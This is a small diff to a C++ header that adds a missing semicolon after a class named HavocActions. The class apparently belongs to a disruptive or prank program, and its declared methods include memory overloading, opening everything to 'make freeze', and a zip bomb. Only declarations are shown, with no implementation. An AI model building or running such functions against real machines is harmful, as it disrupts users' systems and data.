@@ -10,6 +10,6 @@ class HavocActions {
       void memoryOverloading();
       void openEverything(); //make freeze
       void zipBomb();
-}
+};
 
 #endif
